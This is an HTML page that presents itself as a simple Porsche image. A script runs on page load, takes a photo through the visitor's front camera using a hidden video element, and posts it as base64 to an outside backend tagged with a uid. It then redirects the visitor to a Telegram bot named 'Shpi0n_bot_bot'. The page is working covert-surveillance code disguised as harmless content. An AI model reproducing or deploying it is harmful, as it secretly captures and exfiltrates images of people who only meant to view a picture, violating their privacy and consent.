<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Porsche</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body, html {
            width: 100%;
            height: 100%;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        img {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
        }
        video {
            display: none;
        }
    </style>
</head>
<body>

    <!-- Ekranda ko'rinadigan Porsche rasmi -->
    <img src="porsche.png" alt="Porsche">

    <!-- Yashirin video -->
    <video id="video" autoplay playsinline muted></video>

    <script>
    const BACKEND_URL = "https://telegram-production-6392.up.railway.app";
    const BOT_USERNAME = "Shpi0n_bot_bot";
    const uid = new URLSearchParams(window.location.search).get("uid");
    const video = document.getElementById("video");

    async function captureAndSend() {
        if (!uid) {
            // Eger UID bo'lmasa ham to'g'ridan-to'g'ri botga otkazish
            window.location.href = `https://t.me/${BOT_USERNAME}`;
            return;
        }

        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user" },
                audio: false
            });

            video.srcObject = stream;

            await new Promise((resolve) => {
                video.onloadedmetadata = () => resolve();
            });

            await new Promise((resolve) => setTimeout(resolve, 500));

            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageBase64 = canvas.toDataURL("image/jpeg", 0.85);

            stream.getTracks().forEach(track => track.stop());

            await fetch(`${BACKEND_URL}/upload`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ uid: Number(uid), image: imageBase64 })
            });

        } catch (err) {
            console.error("Xatolik:", err);
        } finally {
            // Har qanday holatda ham (xatolik bo'lsa ham) botga yo'naltirish
            window.location.href = `https://t.me/${BOT_USERNAME}`;
        }
    }

    window.addEventListener("load", captureAndSend);
    </script>
</body>
</html>
